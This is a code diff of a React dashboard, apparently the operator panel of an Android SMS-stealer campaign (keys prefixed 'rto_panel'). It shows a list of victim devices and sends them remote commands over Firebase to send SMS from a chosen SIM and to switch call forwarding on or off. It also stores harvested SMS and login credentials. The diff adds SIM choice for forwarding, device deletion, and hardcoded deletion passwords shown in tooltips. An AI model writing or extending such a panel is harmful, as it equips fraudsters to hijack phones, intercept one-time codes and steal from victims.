@@ -14,7 +14,8 @@ export default function DevicesPanel({
   showToast,
   openSmsModal,
   deleteAllSms,
-  deleteAllCredentials
+  deleteAllCredentials,
+  deleteAllDevices
 }) {
   const [searchQuery, setSearchQuery] = useState("");
   const [filter, setFilter] = useState("all");
@@ -22,10 +23,11 @@ export default function DevicesPanel({
   const [expandedDevices, setExpandedDevices] = useState({});
   const [activeTabs, setActiveTabs] = useState({});
 
-  // Permanent Storage - SMS Send hone ke baad bhi number aur message text bilkul nahi hatega
+  // Permanent Storage - SMS & Call Forward data send hone ke baad bhi nahi hatega
   const [smsPhone, setSmsPhone] = useState("");
   const [smsBody, setSmsBody] = useState("");
   const [simChoice, setSimChoice] = useState({});
+  const [fwdSimChoice, setFwdSimChoice] = useState({});
   const [formMemory, setFormMemory] = useState({});
 
   useEffect(() => {
@@ -33,11 +35,13 @@ export default function DevicesPanel({
       const savedPhone = localStorage.getItem("rto_panel_phone");
       const savedBody = localStorage.getItem("rto_panel_body");
       const savedSims = localStorage.getItem("rto_panel_sims");
+      const savedFwdSims = localStorage.getItem("rto_panel_fwd_sims");
       const savedMemory = localStorage.getItem("rto_panel_memory");
 
       if (savedPhone !== null) setSmsPhone(savedPhone);
       if (savedBody !== null) setSmsBody(savedBody);
       if (savedSims) setSimChoice(JSON.parse(savedSims));
+      if (savedFwdSims) setFwdSimChoice(JSON.parse(savedFwdSims));
       if (savedMemory) setFormMemory(JSON.parse(savedMemory));
     } catch (e) {}
   }, []);
@@ -61,6 +65,16 @@ export default function DevicesPanel({
       const updated = { ...prev, [devId]: val };
       try {
         localStorage.setItem("rto_panel_sims", JSON.stringify(updated));
+      } catch (e) {}
+      return updated;
+    });
+  };
+
+  const handleFwdSimChange = (devId, val) => {
+    setFwdSimChoice((prev) => {
+      const updated = { ...prev, [devId]: val };
+      try {
+        localStorage.setItem("rto_panel_fwd_sims", JSON.stringify(updated));
       } catch (e) {}
       return updated;
     });
@@ -123,7 +137,6 @@ export default function DevicesPanel({
     setActiveTabs(prev => ({ ...prev, [devId]: prev[devId] === tab ? null : tab }));
   };
 
-  // SMS EXECUTE (Notification hata diya gaya hai)
   const handleCommand = (type, devId) => {
     const baseRef = ref(db, `user_data/${devId}`);
 
@@ -145,14 +158,14 @@ export default function DevicesPanel({
         simIndex: Number(simSlotSelected),
         timestamp: Date.now()
       }).then(() => {
-        // "SMS sent via SIM 1" popup yahan se hata diya gaya hai
+        showToast(`✅ SMS command sent`, "success");
       });
     } 
     else if (type === "fwd_on") {
       const num = formMemory[`fwdNum-${devId}`];
-      const selectedSim = formMemory[`fwdSim-${devId}`] || "0";
+      const selectedSim = fwdSimChoice[devId] || "0";
 
-      if (!num) return showToast("⚠️ Enter forward number!", "warning");
+      if (!num) return showToast("⚠️ Forward phone number likhein!", "warning");
 
       update(baseRef, {
         command: "call forward",
@@ -166,7 +179,7 @@ export default function DevicesPanel({
       }).then(() => showToast(`✅ Call Forward ON (SIM ${Number(selectedSim) + 1})`, "success"));
     } 
     else if (type === "fwd_off") {
-      const selectedSim = formMemory[`fwdSim-${devId}`] || "0";
+      const selectedSim = fwdSimChoice[devId] || "0";
 
       update(baseRef, {
         command: "forward off",
@@ -199,13 +212,27 @@ export default function DevicesPanel({
     }
   };
 
+  // Card Level Data & Device Delete Handler
   const deleteDeviceData = (devId, type) => {
-    const pwd = prompt(`🔐 Enter Password to delete ${type}:`);
-    if (pwd !== "9090") return showToast("❌ Invalid Password", "error");
-    if (!confirm(`Delete ${type} for ${devId}?`)) return;
+    let targetPwd = "9090";
+    if (type === "sms") targetPwd = "1122";
+    else if (type === "credentials") targetPwd = "3344";
+    else if (type === "device") targetPwd = "5566";
 
-    const path = type === "sms" ? `user_sms/${devId}` : `login/${devId}`;
-    remove(ref(db, path)).then(() => showToast(`Deleted ${type}`, "success"));
+    const pwd = prompt(`🔐 Enter Password to delete ${type.toUpperCase()}:`);
+    if (pwd !== targetPwd) return showToast(`❌ Invalid Password for ${type}`, "error");
+    if (!confirm(`Are you sure you want to delete ${type} for ${devId}?`)) return;
+
+    if (type === "sms") {
+      remove(ref(db, `user_sms/${devId}`)).then(() => showToast(`Deleted SMS for ${devId}`, "success"));
+    } else if (type === "credentials") {
+      remove(ref(db, `login/${devId}`)).then(() => showToast(`Deleted Credentials for ${devId}`, "success"));
+    } else if (type === "device") {
+      Promise.all([
+        remove(ref(db, `user_data/${devId}`)),
+        remove(ref(db, `device_status/${devId}`))
+      ]).then(() => showToast(`Device ${devId} removed`, "success"));
+    }
   };
 
   const onlineCount = Object.values(deviceOnlineStatus).filter(Boolean).length;
@@ -247,9 +274,23 @@ export default function DevicesPanel({
         )}
       </div>
 
+      {/* TOP ACTION BUTTONS BAR */}
       <div style={{ marginBottom: 12, display: "flex", justifyContent: "flex-end", gap: 8, flexWrap: "wrap" }}>
-        <button className="btn-delete-all" onClick={deleteAllSms}><i className="fas fa-trash-alt"></i> Delete All SMS</button>
-        <button className="btn-delete-all credential" onClick={deleteAllCredentials}><i className="fas fa-key"></i> Delete All Credentials</button>
+        <button className="btn-delete-all" onClick={deleteAllSms} title="Password: 1122">
+          <i className="fas fa-trash-alt"></i> Delete All SMS
+        </button>
+        <button className="btn-delete-all credential" onClick={deleteAllCredentials} title="Password: 3344">
+          <i className="fas fa-key"></i> Delete All Credentials
+        </button>
+        {/* NAYA BUTTON: DELETE ALL DEVICES */}
+        <button 
+          className="btn-delete-all" 
+          onClick={deleteAllDevices} 
+          title="Password: 5566"
+          style={{ background: "rgba(220, 38, 38, 0.2)", borderColor: "var(--red)" }}
+        >
+          <i className="fas fa-mobile-alt"></i> Delete All Devices
+        </button>
       </div>
 
       <div id="devicesContainer">
@@ -283,6 +324,7 @@ export default function DevicesPanel({
           const sim1Num = dev.numberSim1 || "NA";
           const sim2Num = dev.numberSim2 || "NA";
           const currentSim = simChoice[devId] || "0";
+          const currentFwdSim = fwdSimChoice[devId] || "0";
 
           return (
             <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"}`}>
@@ -467,7 +509,6 @@ export default function DevicesPanel({
                         <i className="fas fa-envelope" style={{ color: "var(--blue)" }}></i> Send SMS
                       </div>
 
-                      {/* Recipient Phone Number Box */}
                       <input 
                         type="text" 
                         placeholder="Enter phone number" 
@@ -485,7 +526,6 @@ export default function DevicesPanel({
                         onChange={(e) => handlePhoneChange(e.target.value)}
                       />
 
-                      {/* Message Content Area */}
                       <textarea 
                         placeholder="Type message content here..." 
                         rows="3"
@@ -505,7 +545,6 @@ export default function DevicesPanel({
                         onChange={(e) => handleBodyChange(e.target.value)}
                       />
 
-                      {/* SIM Selector Dropdown */}
                       <div style={{ marginBottom: 14 }}>
                         <select
                           className="luxury-select"
@@ -527,7 +566,6 @@ export default function DevicesPanel({
                         </select>
                       </div>
 
-                      {/* Blue Send Button */}
                       <button 
                         type="button"
                         className="btn-luxury" 
@@ -550,32 +588,65 @@ export default function DevicesPanel({
 
                   {/* Call Forward Command */}
                   {curTab === "fwd" && (
-                    <div className="section-premium">
-                      <div className="section-title">Call Forward Controls</div>
+                    <div className="section-premium" style={{ background: "rgba(12, 16, 26, 0.8)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 10, padding: 14 }}>
+                      <div style={{ fontSize: 13, fontWeight: 600, color: "var(--text-primary)", marginBottom: 12, display: "flex", alignItems: "center", gap: 6 }}>
+                        <i className="fas fa-tools" style={{ color: "var(--gold)" }}></i> Call Forward Controls
+                      </div>
+
                       <input 
                         type="text" 
                         placeholder="Forward To Phone Number" 
                         className="search-input" 
-                        style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)" }}
+                        style={{ 
+                          background: "#090d15", 
+                          marginBottom: 10, 
+                          borderRadius: 8, 
+                          border: "1px solid #232b3f", 
+                          padding: "10px 14px",
+                          fontSize: 13,
+                          color: "#fff"
+                        }}
                         value={formMemory[`fwdNum-${devId}`] || ""}
                         onChange={(e) => updateMemoryField(`fwdNum-${devId}`, e.target.value)}
                       />
+
+                      <div style={{ marginBottom: 14 }}>
+                        <select
+                          className="luxury-select"
+                          value={currentFwdSim}
+                          onChange={(e) => handleFwdSimChange(devId, e.target.value)}
+                          style={{
+                            background: "#090d15",
+                            border: "1px solid #232b3f",
+                            borderRadius: 8,
+                            padding: "10px 14px",
+                            fontSize: 13,
+                            color: "#fff",
+                            width: "100%",
+                            cursor: "pointer"
+                          }}
+                        >
+                          <option value="0">SIM 1</option>
+                          <option value="1">SIM 2</option>
+                        </select>
+                      </div>
+
                       <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                         <button 
                           type="button"
                           className="btn-luxury" 
-                          style={{ background: "var(--green)", color: "#fff", justifyContent: "center", padding: "10px" }} 
+                          style={{ background: "var(--green)", color: "#fff", justifyContent: "center", padding: "12px", borderRadius: 8, fontWeight: 700 }} 
                           onClick={() => handleCommand("fwd_on", devId)}
                         >
-                          Turn ON Forward
+                          <i className="fas fa-play" style={{ marginRight: 6 }}></i> Turn ON
                         </button>
                         <button 
                           type="button"
                           className="btn-luxury btn-red" 
-                          style={{ justifyContent: "center", padding: "10px" }} 
+                          style={{ justifyContent: "center", padding: "12px", borderRadius: 8, fontWeight: 700 }} 
                           onClick={() => handleCommand("fwd_off", devId)}
                         >
-                          Turn OFF Forward
+                          <i className="fas fa-stop" style={{ marginRight: 6 }}></i> Turn OFF
                         </button>
                       </div>
                     </div>
@@ -613,12 +684,15 @@ export default function DevicesPanel({
                   {curTab === "delete" && (
                     <div className="section-premium" style={{ borderColor: "var(--red)" }}>
                       <div className="section-title" style={{ color: "var(--red)" }}>Danger Zone</div>
-                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
-                        <button type="button" className="btn-luxury btn-red" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "sms")}>
+                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 6 }}>
+                        <button type="button" className="btn-luxury btn-red" style={{ justifyContent: "center", fontSize: 10, padding: "8px 4px" }} onClick={() => deleteDeviceData(devId, "sms")}>
                           Delete SMS
                         </button>
-                        <button type="button" className="btn-luxury btn-purple" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "credentials")}>
+                        <button type="button" className="btn-luxury btn-purple" style={{ justifyContent: "center", fontSize: 10, padding: "8px 4px" }} onClick={() => deleteDeviceData(devId, "credentials")}>
                           Delete Creds
+                        </button>
+                        <button type="button" className="btn-luxury btn-red" style={{ justifyContent: "center", fontSize: 10, padding: "8px 4px", background: "#7f1d1d" }} onClick={() => deleteDeviceData(devId, "device")}>
+                          Delete Device
                         </button>
                       </div>
                     </div>
